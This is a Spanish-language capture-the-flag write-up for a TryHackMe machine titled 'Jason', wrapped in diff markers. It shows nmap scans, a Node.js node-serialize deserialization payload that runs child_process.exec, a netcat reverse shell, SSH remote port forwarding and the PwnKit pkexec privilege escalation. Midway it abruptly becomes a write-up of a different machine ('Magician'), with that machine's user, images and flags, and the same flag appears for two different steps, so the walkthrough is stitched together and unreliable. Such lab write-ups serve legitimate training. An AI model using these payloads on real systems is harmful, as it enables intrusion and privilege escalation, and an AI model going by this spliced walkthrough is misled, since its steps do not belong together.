@@ -1,0 +1,200 @@
+I"�:<h2 id="writeup-máquina-jason">WriteUp máquina <strong>Jason</strong></h2>
+
+<p>Esta es una maquina con un nivel de dificultad Fácil en TryHackme vamos a ello:</p>
+<h3 id="fase-de-reconocimineto">Fase de reconocimineto</h3>
+<p>Como primer paso realizamos un ping a la maquina para identificar ante que maquina estamos:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">PING 10.10.58.237 (10.10.58.237) 56(84) bytes of data.
+64 bytes from 10.10.58.237: icmp_seq=1 ttl=63 time=307 ms
+</span></code></pre></div></div>
+
+<p>Como observamos la maquina nos responde con un TTL=63 por lo que nos enfrentamos a una maquina linux.</p>
+
+<p>El siguiente paso es ver que puertos abiertos tiene la maquina por lo que realizamos el siguiente escaneo:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.58.237 -oG allPorts
+</span></code></pre></div></div>
+<p>Y vemos los siguientes puertos abiertos:</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td><strong>PORT</strong></td>
+      <td><strong>STATE</strong></td>
+      <td><strong>SERVICE</strong></td>
+      <td>**REASON **</td>
+    </tr>
+    <tr>
+      <td>22/tcp</td>
+      <td>open</td>
+      <td>ssh</td>
+      <td>syn-ack ttl 63</td>
+    </tr>
+    <tr>
+      <td>80/tcp</td>
+      <td>open</td>
+      <td>http</td>
+      <td>syn-ack ttl 63</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Teniendo los puertos abiertos identificamos la version de los servicios expuestos con el siguiente comando:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">nmap -sC -sV -p22,80 10.10.58.237 -oN targeted
+</span></code></pre></div></div>
+<p>Dando como resultado los siguientes servicios:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">PORT   STATE SERVICE VERSION                                                                                                                                                               
+</span><span class="gp">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>                                                                                                          
+<span class="go">| ssh-hostkey:                                                                                                                                                                             
+|   3072 5b:2d:9d:60:a7:45:de:7a:99:20:3e:42:94:ce:19:3c (RSA)                                                                                                                             
+|   256 bf:32:78:01:83:af:78:5e:e7:fe:9c:83:4a:7d:aa:6b (ECDSA)                                                                                                                            
+|_  256 12:ab:13:80:e5:ad:73:07:c8:48:d5:ca:7c:7d:e0:af (ED25519)                                                                                                                          
+80/tcp open  http                                                                                                                                                                          
+| fingerprint-strings:                                                                                                                                                                     
+|   GetRequest, HTTPOptions:                                                                                                                                                               
+|     HTTP/1.1 200 OK                                                                                                                                                                      
+|     Content-Type: text/html                                                                                                                                                              
+|     Date: Wed, 09 Feb 2022 21:12:16 GMT                                                                                                                                                  
+|     Connection: close                                                                                                                                                                    
+</span><span class="gp">|     &lt;html&gt;</span>&lt;<span class="nb">head</span><span class="o">&gt;</span>                                                                                                                                                                         
+<span class="gp">|     &lt;title&gt;</span>Horror LLC&lt;/title&gt;                                                                                                                                                            
+<span class="gp">|     &lt;style&gt;</span><span class="w">                                                                                                                                                                              
+</span><span class="go">|     body {                                                                                                                                                                               
+</span><span class="gp">|     background: linear-gradient(253deg, #</span>4a040d, <span class="c">#3b0b54, #3a343b);                                                                                                                      </span>
+<span class="gp">|     background-size: 300% 300%;</span><span class="w">                                                                                                                                                          
+</span><span class="gp">|     -webkit-animation: Background 10s ease infinite;</span><span class="w">
+</span><span class="gp">|     -moz-animation: Background 10s ease infinite;</span><span class="w">
+</span><span class="gp">|     animation: Background 10s ease infinite;</span><span class="w"> 
+</span><span class="go">|     @-webkit-keyframes Background {
+|     background-position: 0% 50%
+|     background-position: 100% 50%
+|     100% {
+|     background-position: 0% 50%
+|     @-moz-keyframes Background {
+|     background-position: 0% 50%
+|     background-position: 100% 50%
+|     100% {
+|     background-position: 0% 50%
+|     @keyframes Background {
+|     background-position: 0% 50%
+|_    background-posi
+|_http-title: Horror LLC
+
+</span></code></pre></div></div>
+<p>Como podemos observar existe un servicio web por lo que inspeccionamos el servicio en el puerto 80</p>
+
+<p><img src="/images/writeup/jason/panel.png" alt="Panel" /></p>
+
+<p>Vemos que el sitio web menciona que esta hecho con nodejs (<strong>Built with Nodejs</strong>) por lo que lo tenemos encuenta para las posteriores fases.</p>
+
+<h3 id="fase-de-explotacion">Fase de explotacion</h3>
+
+<p>Despues de revisar la funcionalidad del sitio web observamos que al poner un correo en el campo de email address, se nos asigna una cookie donde el valor de session es una cadena en base64 si la decodificamos resulta ser el texto que pusimos de entrada por lo que nos indica que hay algun tipo de procesamiento de los datos como se muestra en la siguiente imagen:
+<img src="/images/writeup/jason/base64.png" alt="Panel" /></p>
+
+<p>Por lo que con los datos hasta ahora ya podriamos deducir el vector de ataque.<br />
+Si buscamos exploit por la web referentes a Nodejs hay uno que llama la atención que es un exploit que permite la ejecución remota de comandos mediante la deserealizacion de los datos tramitados para mas detalles puedes ver el siguiente link:   <br />
+<strong><a href="https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf">Deserealization exploit</a></strong>.</p>
+
+<p>Para replicar este exploit  basicamente necesitamos desarrollar los siguientes pasos:</p>
+
+<h3 id="-1-serializar-los-datos-"><em>** 1 Serializar los datos **</em></h3>
+
+<p>Para ello podemos hacer uso del script serialize.js:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">var y = {
+rce : function(){
+</span><span class="gp">require('child_process').exec('whoami', function(error,stdout, stderr) { console.log(stdout) });</span><span class="w">
+</span><span class="go">},
+}
+</span><span class="gp">var serialize = require('node-serialize');</span><span class="w">
+</span><span class="gp">console.log("Serialized: \n" + serialize.serialize(y));</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Se puede subir directamente la imagen generar pero yo decidi simplemente copiar el contenido del archivo a la peticion<br />
+interceptada de burpsuite:</p>
+
+<p><img src="/images/writeup/magician/revburp.png" alt="Panel" /></p>
+
+<p>Subiendo este archivo nos ponemos a la escucha con netcat y recibimos una shell reversa para luego hacer un tratamiento de la tty:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">root@parrot ▓▒░ nc -nlvp 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.10.89.16 55846
+script /dev/null -c bash
+Script started, file is /dev/null
+</span><span class="gp">magician@magician:/tmp/hsperfdata_magician$</span><span class="w"> </span>^Z
+<span class="go">zsh: suspended  nc -nlvp 4444
+
+</span><span class="gp">root@parrot ▓▒░ stty raw -echo;</span><span class="w"> </span><span class="nb">fg</span>
+<span class="go">[1]  + continued  nc -nlvp 4444
+                               reset xterm
+</span></code></pre></div></div>
+<p>Exportamos las variables de entorno:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">magician@magician:/tmp/hsperfdata_magician$</span><span class="w"> </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
+<span class="gp">magician@magician:/tmp/hsperfdata_magician$</span><span class="w"> </span><span class="nb">export </span><span class="nv">SHELL</span><span class="o">=</span>bash
+<span class="go">
+</span></code></pre></div></div>
+
+<p>Y podemos ver la flag del usuario magician:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">THM{simsalabim_hex_hex}
+</span></code></pre></div></div>
+<h3 id="escalada-de-privilegios">Escalada de privilegios</h3>
+
+<p>Como primer paso en la escalada de privilegios buscamos archivos suspechosos que puedan tener credenciales o archivos de configuracion<br />
+en este caso encontramos un archivo 
+<img src="/images/writeup/magician/archive.png" alt="Panel" /></p>
+
+<p>Inspeccionando el contenido de este archivo nos encontramos con un mensaje:</p>
+
+<p><strong>“The magician is known to keep a locally listening cat up his sleeve, it is said to be an oracle who will tell you secrets if you are good enough to understand its meows.”</strong></p>
+
+<p>El mensaje nos da a entender que hay un puerto a la escucha por lo que verificamos puertos abiertos por lo que verificamos puertos a la escucha:</p>
+
+<p><img src="/images/writeup/magician/netstat.png" alt="Panel" /></p>
+
+<p>Si bien no podemos ver este puerto desde afuera podemos realizar una tecnica llamada port forwarding con el siguiente comando:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">magician@magician:~$</span><span class="w"> </span>ssh <span class="nt">-R</span> 6666:127.0.0.1:6666 root@10.9.3.94                                                                                                                             
+<span class="go">root@10.9.3.94's password:                                                                                                                                                                 
+</span></code></pre></div></div>
+<p>Asi redirigimos todo el trafico del puerto 6666 a nuestra maquina en el puerto 6666.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">root@parrot ▓▒░ nmap -sCV -p6666 127.0.0.1  
+PORT     STATE SERVICE VERSION
+6666/tcp open  http    Gunicorn 20.0.4                                                                                                                                                  
+|_http-server-header: gunicorn/20.0.4                                                                                                                                                   
+|_http-title: The Magic cat                                                                                                                                                             
+|_irc-info: Unable to open connection  
+</span></code></pre></div></div>
+<p>Vemos un servicio HTTP expuesto pero el navegador restringe este tipo de puertos, por lo que debemos habilitar este puerto para ello debemos realizar el siguiente paso en firefox:</p>
+
+<p><img src="/images/writeup/magician/portsRestricted.png" alt="Panel" /></p>
+
+<p>Habilitando este puerto en el navegador observamos un panel donde podemos ver un archivo en este caso se selecciona esta opcion hasta obtener una cadena en base64:</p>
+
+<p><img src="/images/writeup/magician/pANEL6666.png" alt="Panel" /></p>
+
+<p>Decodificamos el resultado y obtenemos la flag:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">root@parrot ▓▒░ echo "VEhNe21hZ2ljX21heV9tYWtlX21hbnlfbWVuX21hZH0K" | base64 -d
+THM{magic_may_make_many_men_mad}
+</span></code></pre></div></div>
+<h3 id="forma-alternativa">Forma alternativa</h3>
+<p>Un reciente vulnerabilidad fue expuesta en estas fechas por lo que hice la prueba si este binario funcionaria ya que pkexec tiene privilegios SUID<br />
+para ello descargamos el exploit disponible en <strong><a href="https://github.com/ly4k/PwnKit">Pwnkit</a></strong> :</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">magician@magician:/tmp$</span><span class="w"> </span><span class="nb">chmod</span> +x  PwnKit 
+<span class="gp">magician@magician:/tmp$</span><span class="w"> </span>./PwnKit 
+<span class="gp">root@magician:/tmp#</span><span class="w"> </span><span class="nb">cd</span> /root
+<span class="gp">root@magician:~#</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">ImageMagick  flask  root.txt
+</span><span class="gp">root@magician:~#</span><span class="w"> </span><span class="nb">cat </span>root.txt 
+<span class="go">THM{magic_may_make_many_men_mad}
+</span></code></pre></div></div>
+
+:ET
